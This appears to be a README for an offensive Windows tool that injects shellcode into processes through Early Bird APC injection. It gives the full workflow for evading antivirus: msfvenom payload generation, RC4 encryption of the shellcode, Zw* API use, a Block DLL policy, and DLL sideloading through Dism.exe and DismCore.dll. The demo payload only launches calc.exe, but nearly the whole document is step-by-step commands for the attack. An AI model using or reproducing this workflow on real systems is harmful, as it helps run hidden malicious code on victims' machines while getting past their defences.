## Overview
The technique known as "Early Bird APC Injection" is used to inject malicious code into the legitimate processes of a Windows operating system. This method inserts malicious code into a process during its early stages, often before the main routines of the process are activated. It also features enhanced antivirus evasion capabilities through the implementation of a Block DLL Policy, which prevents the loading of DLLs not signed by Microsoft, the use of Zw* functions from undocumented APIs in the Windows Kernel, and the utilization of DLL sideloading.

## Generate Payload using MSFvenom
```
msfvenom -p windows/x64/exec cmd="calc.exe" -f raw -o raw.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Saved as: raw.bin
```

## Payload Encryption
RC4 Encrypt Payload: https://github.com/c2pain/RC4_Encryptor

Example:
```
C:\Users\C2Pain\Desktop> rc4_encryptor.exe raw.bin
[+] Encrypted shellcode saved to: r-a-w-4.enc
```

## DLL Sideloading
Using Dism.exe as an example, it has been noted that it loads DismCore.dll.

To locate the exported functions, you can use: https://github.com/c2pain/RustGetExports

You can then include the exported functions to the lib.rs.
```
RustGetExports.exe C:\Windows\System32\Dism\DismCore.dll
DismCore.dll
DllCanUnloadNow
DllGetClassObject
DllRegisterServer
```

## Usage 
You need to compiled the binary and copy C:\Windows\System32\Dism.exe to the same directory to run:
```
cargo build --release
```
